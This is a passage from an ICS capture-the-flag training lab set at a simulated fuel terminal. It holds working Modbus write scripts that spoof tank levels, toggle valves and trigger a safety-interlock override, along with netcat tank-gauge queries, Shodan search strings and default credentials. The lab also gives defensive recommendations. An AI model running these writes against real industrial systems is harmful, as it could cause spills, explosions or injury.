  2. Query-parameter auth bypass. The server login check also honors a ?session=<token> query parameter. If a request carries ?session= whose value equals the server-side session token, the login gate is bypassed and the page renders, even when the request has no cookie. Tokens that travel in URLs leak through browser history, proxy logs, and referrer headers, so any operator who clicks a deep link can hand an attacker a working bypass value.

Both flaws share a root cause: authentication state that an attacker can reconstruct or replay without ever knowing the password.

docs.title: Analysis Questions
docs.text:
1. The API endpoints /api/tanks, /api/pipeline, and /api/alarms all answer without authentication. What data could an attacker harvest by polling these endpoints over time?

Reveal Answer

By polling the API endpoints repeatedly (for example every 30 seconds), an attacker could build a full operational profile of the facility:

  • Delivery schedules: When tank levels suddenly increase, a delivery is occurring. Track these over weeks to predict future deliveries.
  • Customer demand patterns: When levels decrease, product is being sold. The rate reveals customer volume.
  • Operational tempo: Alarm timestamps and pipeline throughput reveal when the terminal is busiest and when the loading berths are active.
  • Product pricing intelligence: Knowing inventory levels and flow rates across five products has direct financial value in commodity markets.
  • Attack timing: Knowing when tanks are fullest (maximum spill potential) or when the pipeline is flowing.

2. Default credentials (operator/hpb2024) were accepted. Why are default credentials so prevalent in ICS environments?

Reveal Answer

Several factors contribute:

  • Deployment by integrators, not IT: ICS systems are installed by control system integrators who prioritize getting the process running. Security hardening is often deferred and never completed.
  • Shared accounts: Operators work in shifts and share a single login. Individual accounts create operational friction when someone needs to take over mid-shift.
  • Fear of lockout: In an emergency, operators need immediate access. Complex passwords and account lockout policies are seen as safety risks.
  • No password policy enforcement: ICS HMI software often lacks password complexity requirements, expiration policies, or multi-factor authentication.
  • Vendor maintenance access: Vendors ship systems with known credentials for remote support and never change them.

3. The session cookie is signed and HttpOnly, yet the walkthrough calls it forgeable. Why is the signed cookie not real protection here, and what else lets an attacker in?

Reveal Answer

The cookie is signed with a hardcoded key (hpb-operator-console-key-2024) compiled into the application source. A signature only protects what an attacker cannot reproduce, and a fixed key in source control or a firmware image is exactly what an attacker can reproduce. Once the key is known, an attacker mints a valid signed session with logged_in: true for any username, and the server trusts it without ever checking a password. Separately, the login gate honors a ?session=<token> query parameter: a request whose query token matches the server session token is admitted even with no cookie, so a token leaked through a URL (history, proxy logs, referrer headers) becomes a reusable bypass. The lesson is that signing and HttpOnly are necessary but not sufficient: a strong secret per-deployment key and a single authoritative session check are what actually hold.

4. The unauthenticated API exposes alarm severities, tank fill percentages, and pipeline throughput. Why is that combination sensitive even without write access?

Reveal Answer

Read-only exposure is still intelligence. Alarm severities and the status fields tell an attacker which tanks the operators consider WARNING or ALARM right now, so an attacker manipulating a level later knows how close each tank already sits to a threshold and how much margin remains before an alert fires. Fill percentages and throughput reveal the safe operating band and the normal range of every variable, so a later attack can stay inside that band and avoid tripping an alarm. Knowing the baseline is what makes a precise, low-and-slow manipulation possible, and information leakage of this kind is a textbook enabler of harder-to-detect attacks.

docs.title: Key Takeaways
docs.text:
What You Learned

  1. HMI web interfaces are full web applications. They carry the same vulnerability classes as any web app: default credentials, missing authentication on data routes, information disclosure, and session management flaws. Standard web application testing techniques apply directly.

  2. The pretty cockpit is fed by ugly plumbing. The dashboard required a login, but the /api/* endpoints behind it served live process data to anyone on the network. In ICS environments, API security is frequently an afterthought, and the data the operator sees is often free for the taking one route over.

  3. HTML comments are a goldmine. The alarm page hid the flag in an HTML comment. Always view the page source during HMI reconnaissance.

  4. Default credentials are the norm in ICS. The operator/hpb2024 credentials worked immediately. In real facilities, shared operator accounts with simple passwords are standard practice.

  5. A signed session is only as strong as its secret. The HMI signed sessions with a hardcoded key and honored a session token in the URL. Signing and HttpOnly look like protection, but a fixed secret and a query-parameter bypass let an attacker forge or replay a session without the password.

Flags collected:

Exercise Flag ICS-1.1 Exposed .git repository ICS-1.2 Modbus register decode ICS-1.3 HMI alarm page source

What you know about the Hex Point Bay Terminal:

  • 5 hosts on a flat OT network with no segmentation

In Level 2: Protocol Exploitation, you will move from reading to writing: manipulating Modbus registers, sending ATG commands, and querying the historian database to extract sensitive operational records.

docs.title: Exercise ICS-2.1: Writing to the Wire
Engagement Status
docs.text:
Client Hex Point Energy Solutions Role Security Intern: OT Network Assessment Phase Discovery Enumeration Exploitation Reporting

What you know so far: You have mapped the Hex Point Bay Terminal network, identified Modbus services on the tank simulator, and read holding registers to pull live process values. The operations manager reported anomalous readings on tank gauges and suspects compromise. It is time to determine whether an attacker could write values to the process, and what happens when they do.

docs.title: Objective
docs.text:
In this exercise you will move from passive Modbus reads to active register and coil writes. You will manipulate tank levels, toggle valve coils, and discover a hidden maintenance override register that yields a flag. By the end you will understand exactly how an attacker with network access can alter a physical process through unauthenticated Modbus writes.

Detail Value Difficulty Intermediate Estimated Time 45-60 minutes Prerequisites ICS-1.1 (Network Discovery), ICS-1.2 (Modbus Enumeration)

docs.title: Background: Modbus Write Function Codes
docs.text:
In Level 1 you used Function Code 03 (Read Holding Registers) to pull process values off the wire. Modbus defines several write function codes that are equally simple, and equally unauthenticated:

FC Name Purpose 05 Write Single Coil Toggle a discrete output (valve, relay, motor starter) ON or OFF 06 Write Single Register Set one 16-bit holding register to a new value 15 Write Multiple Coils Toggle a block of discrete outputs in one request 16 Write Multiple Registers Set a contiguous block of holding registers in one request

Real-World Impact

Unauthorized Modbus writes have caused real incidents. The most famous example is Stuxnet (2010), which wrote modified frequency values to Siemens S7-315 PLCs controlling uranium centrifuges at Natanz, causing them to spin outside safe parameters while reporting normal values to the operator HMI. In a petroleum terminal like Hex Point Bay, unauthorized writes could overflow a storage tank, open a valve during ship loading, or disable emergency shutdown logic.

docs.title: Why Writes Are Dangerous in OT
docs.text:
In IT networks, writing bad data to a database is recoverable: you restore from backup. In OT, a bad write can cause:

  • Tank overflow: changing a level register fools the control logic into thinking a tank is empty when it is full
  • Valve failure: toggling a coil opens or closes a physical valve, potentially mixing incompatible products
  • Pipeline rupture: setting pressure beyond safe limits while suppressing alarms
  • Environmental disaster: fuel spills, gas leaks, or chemical releases

docs.title: Maintenance Override Registers
docs.text: Many PLCs and RTUs include special "maintenance" or "engineering" registers that unlock diagnostic modes or bypass safety interlocks. These registers are often documented only in vendor service manuals and rely on security by obscurity: the assumption that an attacker will not know the register address or the magic value to write. As you will see in this exercise, that assumption fails the moment an attacker finds the documentation.

docs.title: Tools You'll Need
docs.text: Tool Purpose Install Check Python 3 Scripting language python3 --version pymodbus Modbus client library python3 -c "import pymodbus" netcat TCP connectivity testing nc -h curl Fetching documentation pages curl --version

docs.text: Flag Source Found? OCR{...} Maintenance override registers 51-54

docs.title: Step 1: Confirm Connectivity and Read Baseline Values
docs.text:
Before writing anything, capture the current state of the process so you can observe changes. Connect to the tank simulator and read Tank 1 registers (holding 0-3).

python3 - <<'PYEOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('sim.hexpoint.local', port=502)
client.connect()

# Read Tank 1: level%, temp°F, pressure PSI, flow BPH
result = client.read_holding_registers(0, 4, slave=1)
print("Tank 1 Baseline:")
print(f"  Level:    {result.registers[0]}%")
print(f"  Temp:     {result.registers[1]}°F")
print(f"  Pressure: {result.registers[2]} PSI")
print(f"  Flow:     {result.registers[3]} BPH")

client.close()
PYEOF
Expected Output 

Tank 1 Baseline:
  Level:    7200%
  Temp:     142°F
  Pressure: 14 PSI
  Flow:     850 BPH
Note: Values are scaled integers. A level of 7200 represents 72.00%. Your exact values will vary because the simulator updates in real time.

Record Your Baseline

Write down these values. After each write operation you will re-read the registers to confirm the change took effect.

docs.title: Step 2: Write a New Value to Tank 1 Level Register
docs.text:
Use Function Code 06 (Write Single Register) to change Tank 1's reported level. You will write the value 9999 to register 0, simulating an attacker spoofing the level to 99.99%.

python3 - <<'PYEOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('sim.hexpoint.local', port=502)
client.connect()

# Write 9999 to register 0 (Tank 1 level)
write_result = client.write_register(0, 9999, slave=1)
print(f"Write result: {write_result}")

# Read back to confirm the change
result = client.read_holding_registers(0, 4, slave=1)
print("\nTank 1 After Write:")
print(f"  Level:    {result.registers[0]}%")
print(f"  Temp:     {result.registers[1]}°F")
print(f"  Pressure: {result.registers[2]} PSI")
print(f"  Flow:     {result.registers[3]} BPH")

client.close()
PYEOF
Expected Output 

Write result: WriteRegisterResponse(0)

Tank 1 After Write:
  Level:    9999%
  Temp:     142°F
  Pressure: 14 PSI
  Flow:     850 BPH
The level register now reads 9999: a value you set. The PLC accepted the write without any authentication challenge.

No Authentication Required

Notice that Modbus did not ask for a username, password, certificate, or any form of credential. The protocol has zero built-in authentication. If you can reach TCP port 502, you can write.

docs.title: Step 3: Toggle Valve Coils
docs.text:
Coils represent discrete on/off outputs: typically valves, relays, or motor starters. The Hex Point Bay Terminal maps coils 0-8 to individual valves and coil 9 to the emergency shutdown (ESD) system. Use Function Code 05 (Write Single Coil) to open and close valves.

python3 - <<'PYEOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('sim.hexpoint.local', port=502)
client.connect()

# Read current coil states (0-9)
coils = client.read_coils(0, 10, slave=1)
print("Current Coil States:")
labels = [
    "Valve 1 (Tank 1 inlet)", "Valve 2 (Tank 1 outlet)",
    "Valve 3 (Tank 2 inlet)", "Valve 4 (Tank 2 outlet)",
    "Valve 5 (Tank 3 inlet)", "Valve 6 (Tank 3 outlet)",
    "Valve 7 (Pipeline main)", "Valve 8 (Ship loading)",
    "Valve 9 (Emergency vent)", "ESD (Emergency Shutdown)"
]
for i, label in enumerate(labels):
    state = "OPEN" if coils.bits[i] else "CLOSED"
    print(f"  Coil {i}: {label} -- {state}")

# Toggle Valve 1 (coil 0) -- open it
print("\n--- Writing coil 0 = True (OPEN) ---")
client.write_coil(0, True, slave=1)

# Toggle Valve 2 (coil 1) -- close it
print("--- Writing coil 1 = False (CLOSED) ---")
client.write_coil(1, False, slave=1)

# Read back
coils = client.read_coils(0, 10, slave=1)
print("\nCoil States After Write:")
for i, label in enumerate(labels):
    state = "OPEN" if coils.bits[i] else "CLOSED"
    print(f"  Coil {i}: {label} -- {state}")

client.close()
PYEOF
Expected Output 
Current Coil States:
  Coil 0: Valve 1 (Tank 1 inlet) -- CLOSED
  Coil 1: Valve 2 (Tank 1 outlet) -- OPEN
  Coil 2: Valve 3 (Tank 2 inlet) -- CLOSED
  Coil 3: Valve 4 (Tank 2 outlet) -- OPEN
  Coil 4: Valve 5 (Tank 3 inlet) -- CLOSED
  Coil 5: Valve 6 (Tank 3 outlet) -- CLOSED
  Coil 6: Valve 7 (Pipeline main) -- OPEN
  Coil 7: Valve 8 (Ship loading) -- CLOSED
  Coil 8: Valve 9 (Emergency vent) -- CLOSED
  Coil 9: ESD (Emergency Shutdown) -- CLOSED

--- Writing coil 0 = True (OPEN) ---
--- Writing coil 1 = False (CLOSED) ---

Coil States After Write:
  Coil 0: Valve 1 (Tank 1 inlet) -- OPEN
  Coil 1: Valve 2 (Tank 1 outlet) -- CLOSED
  ...

Physical Consequence

You just opened Tank 1's inlet valve and closed its outlet valve. In a real terminal, this would allow product to flow into the tank with no way to drain: eventually causing an overflow. Unauthorized valve manipulation of this kind could result in an environmental spill or explosion.

docs.title: Step 4: Observe the Impact on the HMI Dashboard
docs.text:
Open the HMI dashboard in your browser to see the effect of your writes.

curl -s http://hmi.hexpoint.local/ | head -50

Visual Verification

If you have browser access, navigate to http://hmi.hexpoint.local/ directly. You should see Tank 1's level gauge showing 99.99% and valve status indicators reflecting your coil writes. Any alarms that triggered will appear in the alarm panel.

Check the alarm input registers to see if your writes triggered any safety alarms:

python3 - <<'PYEOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('sim.hexpoint.local', port=502)
client.connect()

alarms = client.read_input_registers(0, 10, slave=1)
print("Alarm Status (Input Registers 0-9):")
alarm_names = [
    "Tank 1 High Level", "Tank 1 Low Level",
    "Tank 2 High Level", "Tank 2 Low Level",
    "Tank 3 High Level", "Tank 3 Low Level",
    "Pipeline Pressure", "Ship Loading Fault",
    "ESD Activated", "General Alarm"
]
for i, name in enumerate(alarm_names):
    status = "ACTIVE" if alarms.registers[i] else "CLEAR"
    print(f"  IR {i}: {name} -- {status}")

client.close()
PYEOF
Expected Output 
Alarm Status (Input Registers 0-9):
  IR 0: Tank 1 High Level -- ACTIVE
  IR 1: Tank 1 Low Level -- CLEAR
  IR 2: Tank 2 High Level -- CLEAR
  ...

docs.title: Step 5: Discover the Maintenance Override Register
docs.text:
The operations manager mentioned that a service technician visited last month and used a "maintenance mode" to calibrate sensors. Check the documentation server for clues.

curl -s http://docs.hexpoint.local:8888/emergency-procedures | grep -i -A5 "maintenance\|override\|register 50"
Expected Output 
MAINTENANCE OVERRIDE PROCEDURE (AUTHORIZED TECHNICIANS ONLY)
============================================================
To enter maintenance mode, write the service code to Holding Register 50.
The current service code is documented in the vendor binder (Section 7.4).
Override confirmation will be written to registers 51-54.

WARNING: Maintenance mode disables all safety interlocks.

Security by Obscurity

The documentation tells you the register address (50) and that a "service code" is required, but not the code itself. In a real engagement, you might find the code in a vendor manual PDF on a file share, in a technician's email, or through brute force. For this exercise, the code is 31337: a well-known "elite" number in hacker culture that terminal vendors have actually used as default service codes.

docs.title: Step 6: Trigger the Maintenance Override and Capture the Flag
docs.text:
Write the value 31337 to holding register 50, then read registers 51-54 to retrieve the ASCII-encoded flag.

python3 - <<'PYEOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('sim.hexpoint.local', port=502)
client.connect()

# Write the maintenance override code
print("Writing 31337 to register 50 (maintenance override)...")
result = client.write_register(50, 31337, slave=1)
print(f"Write result: {result}")

# Read the override flag registers (51-54)
flag_regs = client.read_holding_registers(51, 4, slave=1)
print(f"\nRaw register values: {flag_regs.registers}")

# Decode ASCII -- each register holds two characters
flag = ''
for reg in flag_regs.registers:
    high_byte = (reg >> 8) & 0xFF
    low_byte = reg & 0xFF
    if high_byte > 0:
        flag += chr(high_byte)
    if low_byte > 0:
        flag += chr(low_byte)

print(f"Decoded flag: {flag}")

client.close()
PYEOF
Expected Output 
Writing 31337 to register 50 (maintenance override)...
Write result: WriteRegisterResponse(50)

Raw register values: [20291, 27953, 25458, ...]
Decoded flag: OCR{...find_me...}

Flag Captured!

Submit the decoded flag from registers 51-54 in the platform.

You discovered and exploited a maintenance override register using an undocumented service code. In a real assessment, this would be a critical finding: an attacker with network access can disable safety interlocks with a single Modbus write.

docs.title: Analysis Questions
docs.text:
1. What is the physical impact of unauthorized register manipulation on a petroleum terminal?

Reveal Answer

Manipulating tank level registers can fool the control system into overfilling or under-filling tanks, leading to spills, product mixing, or running pumps dry. Toggling valve coils can redirect product flow, open loading arms during ship departure, or disable emergency vents. Changing pressure setpoints on pipelines can cause ruptures. The consequences range from environmental contamination to explosions and loss of life.

2. Why is "security by obscurity", hiding the maintenance register address and code, insufficient protection?

Reveal Answer

Obscurity fails because: (1) documentation leaks: vendor manuals end up on file shares, documentation servers, or the internet; (2) register addresses can be brute-forced by writing candidate values to every register and checking for responses; (3) the magic value (31337) is a well-known constant that appears in wordlists; (4) Wireshark captures of legitimate maintenance sessions reveal both the address and value. Defense must use authentication and authorization, not secrecy.

3. How would you detect unauthorized Modbus writes in a production environment?

Reveal Answer

Deploy a Modbus-aware IDS (e.g., Snort with Modbus preprocessor, Claroty, Dragos) that inspects function codes and flags FC05/06/15/16 from unauthorized source IPs. Implement allowlisting so that only the engineering workstation can issue writes. Use a data historian to detect sudden value changes that deviate from physical process norms. Enable audit logging on the PLC if supported, and send logs to a SIEM for correlation.

4. How does this attack differ from Stuxnet's approach?

Reveal Answer

Stuxnet was far more sophisticated: it compromised the engineering workstation, modified PLC ladder logic (not just data registers), and replayed recorded "normal" values to the HMI so operators saw nothing wrong. The exercise you just completed demonstrates a simpler direct-write attack that would be visible on the HMI. However, an attacker who combines register writes with HMI spoofing (writing false values to display registers) could achieve Stuxnet-like stealth without modifying PLC code.

docs.title: Defensive Recommendations
docs.text: Finding Risk Mitigation Unauthenticated Modbus writes accepted from any host Critical Deploy Modbus-aware firewall (e.g., Tofino, Fortinet OT) that allowlists source IPs for write function codes No network segmentation between IT and OT Critical Implement IEC 62443 zones and conduits with a DMZ between corporate and control networks Maintenance override accessible via network High Require physical key switch or local console access for maintenance mode: never allow remote override No anomaly detection on register values High Deploy OT monitoring (Dragos, Claroty, Nozomi) to baseline normal register ranges and alert on deviations Safety interlocks bypassable via software Critical Use hardwired safety instrumented systems (SIS) that cannot be overridden by Modbus commands

docs.title: Key Takeaways
docs.text:
• Modbus has no authentication: any host that can reach TCP/502 can read and write registers and coils without credentials
  • Write function codes (FC05, FC06, FC15, FC16) allow direct manipulation of physical process values, valve states, and safety systems
  • Maintenance override registers are a common pattern in industrial controllers and represent a high-value target for attackers
  • Security by obscurity fails when documentation leaks, traffic is captured, or register spaces are brute-forced
  • Defense in depth requires network segmentation, protocol-aware firewalls, anomaly detection, and hardwired safety systems that operate independently of the control network
  • Physical consequences distinguish OT attacks from IT attacks: unauthorized writes can cause equipment damage, environmental disasters, and loss of life

Engagement Status
docs.text:
Client Hex Point Energy Solutions Role Security Intern: OT Network Assessment Phase Discovery Enumeration Exploitation Reporting

What you know so far: You have mapped the network, enumerated Modbus registers, and demonstrated write access to the control system. The tank simulator exposes a second service on port 10001 that you have not yet explored. Port 10001 corresponds to the Veeder-Root TLS-350 Automatic Tank Gauge protocol: a completely separate interface to the same physical tanks.

docs.title: Objective
docs.text:
In this exercise you will interact with the TLS-350 ATG protocol to query tank inventory, delivery reports, and sensor data. You will learn how ATGs work, why thousands of them are exposed on the internet, and how the protocol differs from Modbus. A flag is hidden in the tank inventory response.

Detail Value Difficulty Intermediate Estimated Time 35-45 minutes Prerequisites ICS-1.1 (Network Discovery), ICS-1.2 (Modbus Enumeration)

docs.title: Background: Automatic Tank Gauges and the TLS-350 Protocol
What Is an ATG?
docs.text:
An Automatic Tank Gauge (ATG) is a device that continuously monitors underground storage tanks (USTs) at fuel stations, petroleum terminals, and chemical storage facilities. ATGs measure:

  • Product level: how much fuel is in the tank (gallons or liters)
  • Water level: water contamination at the bottom of the tank
  • Temperature: used to calculate net volume (fuel expands with heat)
  • Ullage: the empty space remaining in the tank
  • Delivery detection: automatic logging when a fuel truck fills the tank
  • Leak detection: statistical analysis of level changes to detect underground leaks

ATGs are critical for environmental compliance. The US EPA requires continuous leak monitoring for underground fuel tanks. A leaking tank that goes undetected contaminates groundwater with benzene and other carcinogens.

docs.title: The Veeder-Root TLS-350
docs.text:
The Veeder-Root TLS-350 is the most widely deployed ATG in North America. It communicates using a proprietary serial protocol that was later adapted for TCP/IP on port 10001. The protocol uses ASCII commands prefixed with the Start of Header character ^A (SOH, 0x01) followed by a function code.

Protocol Format

TLS-350 commands follow the pattern: <SOH>Ixxxxx where <SOH> is the ASCII SOH character (Ctrl-A), I indicates an inventory/report command, and xxxxx is the function code. In practice, sending ^AI20100 from a terminal emulator or piping it through netcat works because most ATG implementations accept the literal two-character sequence ^A as well.

docs.title: Common TLS-350 Commands
docs.text: Command Function Description ^AI20100 Tank Inventory Current levels, volumes, temperatures for all tanks ^AI20200 Delivery Report Recent fuel deliveries with timestamps and volumes ^AI20300 Leak Test Results Most recent leak detection test outcomes ^AI20400 Shift Report Volume changes during operator shifts ^AI20500 Pressure Line Leak Pressure line test results ^AI20600 Temperature Report Detailed temperature readings per tank

docs.title: Internet-Exposed ATGs: A Brief History
docs.text:
In January 2015, security researcher HD Moore (creator of Metasploit) published research showing that over 5,300 ATGs were directly accessible from the internet on port 10001 with no authentication. These devices responded to inventory queries from any IP address, revealing:

  • Gas station names and locations (from tank product labels)
  • Current fuel levels and capacity (useful for theft planning)
  • Alarm status (indicating which stations had maintenance issues)
  • Tank configuration (number of tanks, products stored)

Still Exposed Today

A Shodan search for port:10001 "IN-TANK INVENTORY" still returns hundreds of ATGs connected directly to the internet. The protocol has no authentication mechanism: if you can reach port 10001, you can query (and in some cases configure) the device.

docs.title: Why ATGs Matter for Security
docs.text:
ATGs are interesting targets because:

  1. No authentication: the protocol was designed for serial connections and never added security
  2. Environmental data: leak test results and tank levels are regulated data under EPA rules
  3. Operational intelligence: delivery schedules reveal supply chain patterns
  4. Potential for manipulation: some ATG commands can modify tank labels, alarm thresholds, or calibration data
  5. Pivot point: ATGs sit on OT networks alongside PLCs, RTUs, and HMIs

docs.title: Tools You'll Need
docs.text: Tool Purpose Install Check netcat (nc) Raw TCP connection to ATG port nc -h bash Piping commands to netcat Built-in Python 3 Parsing structured responses (optional) python3 --version

docs.title: Step 1: Connect to the ATG Port with Netcat
docs.text:
The tank simulator exposes the TLS-350 service on port 10001. Start by verifying connectivity.

nc -zv sim.hexpoint.local 10001
Expected Output 
Connection to sim.hexpoint.local 10001 port [tcp/*] succeeded!

Now open an interactive session. The ATG will not send a banner: it waits for you to issue a command.

echo -ne '\x01I20100' | nc -w 5 sim.hexpoint.local 10001

SOH Character

The \x01 is the ASCII SOH (Start of Header) character. Some ATG implementations also accept the literal text ^A. If the hex escape does not work, try: echo -e '^AI20100' | nc -w 5 sim.hexpoint.local 10001. The -w 5 flag tells netcat to wait 5 seconds for the response before closing.

Expected Output 
I20100
03/18/2026 14:22

IN-TANK INVENTORY

TANK 1: OCR{...find_me...}
PRODUCT: UNLEADED REGULAR
VOLUME:   8245 GALLONS
ULLAGE:   3755 GALLONS
HEIGHT:   52.3 INCHES
WATER:     0.2 INCHES
TEMP:     62.4 DEG F

TANK 2: UST-2 DIESEL
PRODUCT: DIESEL #2
VOLUME:   5120 GALLONS
ULLAGE:   6880 GALLONS
HEIGHT:   34.1 INCHES
WATER:     0.0 INCHES
TEMP:     61.8 DEG F

Flag Captured!

Submit the flag found in the Tank 1 name field.

The flag is embedded in the Tank 1 name field. In a real-world scenario, this field contains the tank label or location identifier (e.g., "UST-1 PREMIUM"). Here it has been replaced with the flag token. The substitution demonstrates that ATG responses leak operational data: including identifiers that could reveal site names, addresses, or internal asset labels.

docs.title: Step 2: Parse the Inventory Response
docs.text:
Take a closer look at each field in the inventory response:

Field Value Meaning VOLUME 8245 GALLONS Current product volume in the tank ULLAGE 3755 GALLONS Remaining empty space (capacity minus volume) HEIGHT 52.3 INCHES Product height measured by the float probe WATER 0.2 INCHES Water level at the bottom (contamination indicator) TEMP 62.4 DEG F Product temperature (affects volume calculations)

Capacity Calculation

Volume + Ullage = Total Capacity. Tank 1: 8245 + 3755 = 12,000 gallons. Tank 2: 5120 + 6880 = 12,000 gallons. Both tanks have identical capacity, which is typical for standardized UST installations.

docs.title: Step 3: Query the Delivery Report
docs.text:
The delivery report shows recent fuel deliveries: useful intelligence for understanding supply chain patterns.

echo -ne '\x01I20200' | nc -w 5 sim.hexpoint.local 10001
Expected Output 
I20200
03/18/2026 14:23

DELIVERY REPORT

TANK 1: OCR{...find_me...}
PRODUCT: UNLEADED REGULAR
  START: 03/16/2026 08:15  VOL:  5200 GAL  HEIGHT: 31.2 IN  TEMP: 58.1 F
  END:   03/16/2026 08:47  VOL:  8890 GAL  HEIGHT: 53.4 IN  TEMP: 59.3 F
  DELIVERY VOLUME:  3690 GAL

TANK 2: UST-2 DIESEL
PRODUCT: DIESEL #2
  START: 03/15/2026 11:30  VOL:  2800 GAL  HEIGHT: 18.7 IN  TEMP: 60.2 F
  END:   03/15/2026 12:05  VOL:  6450 GAL  HEIGHT: 43.0 IN  TEMP: 61.0 F
  DELIVERY VOLUME:  3650 GAL

Intelligence Value

An attacker can determine delivery schedules, volumes, and product types. Delivery intelligence could be used to plan fuel theft (target tanks right after delivery when they are fullest) or to disrupt supply chains.

docs.title: Step 4: Query Leak Test Results
docs.text:
Environmental compliance depends on regular leak detection tests. Query the most recent results.

echo -ne '\x01I20300' | nc -w 5 sim.hexpoint.local 10001
Expected Output 
I20300
03/18/2026 14:24

LEAK TEST RESULTS

TANK 1: OCR{...find_me...}
  TEST TYPE: 0.20 GAL/HR
  START: 03/17/2026 02:00
  DURATION: 4.0 HOURS
  RESULT: PASS
  RATE: -0.02 GAL/HR

TANK 2: UST-2 DIESEL
  TEST TYPE: 0.20 GAL/HR
  START: 03/17/2026 02:00
  DURATION: 4.0 HOURS
  RESULT: PASS
  RATE: +0.01 GAL/HR

Leak Test Interpretation

The test measures volume change rate over a quiet period (usually overnight). A rate within +/- 0.20 GAL/HR is a PASS. Negative rates may indicate a small leak; positive rates may indicate thermal expansion. Both tanks passed, meaning no detectable leaks, but an attacker who could modify this data could hide a real leak or trigger a false alarm that shuts down operations.

docs.title: Step 6: Compare TLS-350 with Modbus
docs.text:
You have now interacted with two different protocols that expose the same physical process. Consider the similarities and differences:

Aspect Modbus (TCP/502) TLS-350 (TCP/10001) Authentication None None Data Format Binary (16-bit registers) ASCII text (human-readable) Read Access Function codes 01-04 ^AI2xxxx commands Write Access Function codes 05, 06, 15, 16 Configuration commands (vendor-specific) Designed For PLC/RTU communication Serial tank gauge reporting Encryption None None Discovery Shodan dork: port:502 Shodan dork: port:10001 "IN-TANK"

Two Protocols, Zero Security

Both protocols were designed for isolated serial networks where physical access was the only security boundary. Neither was intended for TCP/IP networks, yet both have been adapted for Ethernet without adding any security. An attacker on the OT network has two independent paths to the same process data.

docs.title: Analysis Questions
docs.text:
1. How many ATGs are estimated to be exposed on the internet today, and what risks does this create?

Reveal Answer

As of recent Shodan scans, several hundred to over a thousand ATGs remain directly accessible on the internet. The number fluctuates as ISPs and operators gradually remediate exposure. Risks include: reconnaissance of fuel station operations, environmental data manipulation (hiding leaks or triggering false alarms), operational disruption (modifying alarm thresholds), and using ATGs as pivot points into connected OT networks. In 2015 HD Moore documented over 5,300; the number has decreased but the problem persists.

2. What is the fundamental difference between the Modbus and TLS-350 security models?

Reveal Answer

There is no fundamental difference: both have no security model at all. Neither protocol implements authentication, authorization, encryption, or integrity checking. The only practical difference is the data format: Modbus uses binary encoding requiring a client library to interpret, while TLS-350 uses ASCII text that is human-readable with netcat. Both are equally vulnerable to eavesdropping, replay, and injection attacks. The "security" of both protocols relies entirely on network-level controls (firewalls, segmentation) that were never part of the protocol specification.

3. What could an attacker accomplish with write access to an ATG?

Reveal Answer

ATG write commands (which vary by vendor and model) could allow an attacker to: (1) modify tank labels to confuse operators; (2) change alarm thresholds so high-level alarms never trigger, enabling overflow; (3) alter calibration data so reported volumes are inaccurate, hiding theft or masking leaks; (4) disable leak detection to allow environmental contamination to go undetected; (5) trigger false alarms to force unnecessary shutdowns and inspection costs. In a worst case, suppressing high-level alarms during a delivery could cause a tank overflow and fuel spill.

docs.title: Defensive Recommendations
docs.text: Finding Risk Mitigation TLS-350 service accessible on the network without authentication High Isolate ATG on a dedicated monitoring VLAN; restrict access to authorized management stations only Port 10001 reachable from any host on the OT network High Firewall rules limiting ATG access to the historian and HMI subnets only No encryption on ATG communications Medium Deploy a TLS-terminating proxy or VPN tunnel for ATG data if remote monitoring is required ATG exposes operational data (volumes, delivery schedules, leak tests) Medium Treat ATG data as sensitive OT intelligence; apply need-to-know access controls ATG firmware may support write/configuration commands High Verify vendor documentation for available write commands; disable any unused remote configuration features Dual-protocol exposure (Modbus + TLS-350) on same device High Segment each protocol onto separate network interfaces or VLANs with independent access controls

docs.title: Key Takeaways
docs.text:
• Automatic Tank Gauges are critical environmental monitoring devices that use the unauthenticated TLS-350 protocol on TCP port 10001
  • HD Moore's 2015 research revealed thousands of internet-exposed ATGs, and hundreds remain accessible today
  • TLS-350 commands are human-readable ASCII strings that can be sent with nothing more than netcat: no special tools required
  • ATG responses leak operational intelligence including fuel levels, delivery schedules, leak test results, and site identifiers
  • Two protocols, zero security: the same terminal exposes both Modbus (binary, port 502) and TLS-350 (ASCII, port 10001), neither with authentication
  • Defense requires network controls because the protocols themselves have no built-in security; firewalls, segmentation, and monitoring are the only options

Client Hex Point Energy Solutions Role Security Intern: OT Network Assessment Phase Discovery Enumeration Exploitation Reporting

What you know so far: You have mapped the Hex Point Bay Terminal network, read and written Modbus registers, queried the ATG, and explored the HMI. The documentation server at docs.hexpoint.local:8888 revealed a network diagram showing a process historian at historian.hexpoint.local:5432. Historians store every SCADA reading in a time-series database: if you can access it, you can reconstruct exactly what happened to the terminal's tanks and pipelines over time.

docs.title: Objective
docs.text:
In this exercise you will connect to the historian database, enumerate its schema, query historical process data, and uncover evidence of the compromise that the operations manager reported. You will find anomalous readings, correlate data across multiple tables, and discover a flag hidden in the operator log.

Detail Value Difficulty Intermediate Estimated Time 45-60 minutes Prerequisites ICS-1.1, ICS-1.2, ICS-1.3 (HMI Reconnaissance)

docs.title: Background: Process Historians in ICS Environments
What Is a Process Historian?
docs.text:
A process historian is a specialized database that records time-stamped process data from SCADA systems, PLCs, and RTUs. Every few seconds (or faster), sensor readings, temperatures, pressures, levels, flow rates, valve states, are written to the historian for:

  • Trend analysis: operators review historical graphs to spot anomalies
  • Regulatory compliance: EPA, OSHA, and API standards require retention of process data
  • Incident investigation: after an event, engineers reconstruct what happened from historian data
  • Process optimization: historical data reveals inefficiencies and optimization opportunities

docs.title: Common Historian Platforms
docs.text:
Platform Vendor Database Type PI System OSIsoft (now AVEVA) Proprietary time-series Wonderware Historian AVEVA Microsoft SQL Server backend GE Proficy Historian GE Digital Proprietary + SQL interface InfluxDB InfluxData Open-source time-series PostgreSQL / TimescaleDB Open Source Relational + time-series extension

Large facilities use dedicated historian platforms. Smaller operations, like the Hex Point Bay Terminal, sometimes use PostgreSQL with time-series tables, which is simpler to deploy but lacks the hardened access controls of purpose-built historian software.

docs.title: Why Historians Are Valuable Targets
docs.text:
Historians are a goldmine for attackers:

  1. Operational intelligence: historical data reveals production schedules, tank fill patterns, and maintenance windows
  2. Evidence of prior compromise: if an attacker manipulated registers, the historian may have recorded the anomalous values before the attacker knew to cover their tracks
  3. Credentials: historian databases often store connection strings, API keys, or operator credentials in configuration tables
